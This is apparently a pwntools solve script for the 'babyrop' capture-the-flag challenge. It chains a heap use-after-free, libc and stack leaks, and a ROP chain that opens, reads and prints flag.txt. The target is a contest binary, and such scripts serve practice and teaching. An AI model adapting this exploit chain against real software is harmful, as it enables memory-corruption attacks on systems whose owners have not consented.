#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'mc.ax', 31245
binary = './babyrop_patched'
brkpts = '''
c
'''

elf = ELF("babyrop_patched")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})


def choice(idx, nl = True):
    if nl:
        sl(str(idx))
    else:
        sa("enter your string: ", str(idx))

def create(idx, size, data):
    choice('C')
    choice(idx)
    choice(size)
    choice(data, False)

def free(idx):
    choice('F')
    choice(idx)

def read(idx):
    choice('R')
    choice(idx)

def write(idx, data):
    choice('W')
    choice(idx)
    choice(data, False)

if __name__ == "__main__":
    for i in range(9):
        create(i, 0x90, "a")
    
    for i in range(8):
        free(i)

    read(7)
    reu("bytes\n ")
    leaks = rl().split(" ")

    libc_leak = u64("".join(chr(int("0x" + i, 16)) for i in leaks[0:8]))
    # heap_leak = u64("".join(chr(int("0x" + i, 16)) for i in leaks[0xa8:0xb0]))
    # heap_base = heap_leak - 0x1ce0

    libc.address = libc_leak - 0x1f4cc0

    # log.info("libc @ "+hex(libc.address))
    # log.info("heap @ "+hex(heap_base))

    environ = libc.symbols['environ']
    
    create(0, 0x10, "a")
    create(1, 0x10, "a")
    free(0)
    free(1)

    create(2, 0x30, "a")

    payload = p64(8) + p64(environ)
    create(3, 0x10, payload)

    read(0)
    reu("bytes\n ")
    leaks = rl().split(" ")
    
    stack_leak = u64("".join(chr(int("0x" + i, 16)) for i in leaks[0:8]))
    retaddr = stack_leak - 0x140

    # log.info("stack @ "+hex(stack_leak))

    pop_rdi = libc.address + 0x2d7dd
    pop_rsi = libc.address + 0x2eef9
    pop_rdx = libc.address + 0xd9c2d
    pop_rax = libc.address + 0x448a8
    # 3b04c : mov qword ptr [rdx], rax ; ret
    mov_qword_rax_rdx = libc.address + 0x3b04c
    syscall = libc.address + 0x888f2

    bss = 0x404500

    file_name = "flag.txt".ljust(8, "\x00")
    ropchain = flat([
        # open(flag_name, 0, 0)
        pop_rax, file_name,
        pop_rdx, bss,
        mov_qword_rax_rdx,
        pop_rdi, bss,
        pop_rsi, 0,
        pop_rdx, 0,
        pop_rax, 2,
        syscall,
        # read(3, bss, 0x50)
        pop_rdi, 3,
        pop_rsi, bss+0x10,
        pop_rdx, 0x50,
        pop_rax, 0,
        syscall,
        # write(1, bss, 0x50)
        pop_rdi, 1,
        pop_rsi, bss+0x10,
        pop_rdx, 0x50,
        pop_rax, 1,
        syscall,
    ])

    create(0, 0x10, "a")
    create(1, 0x10, "a")
    free(0)
    free(1)

    create(2, 0x30, "a")

    payload = p64(len(ropchain)) + p64(retaddr)
    create(3, 0x10, payload)

    write(0, ropchain)

    choice('E')
    choice(0)

    io.interactive()
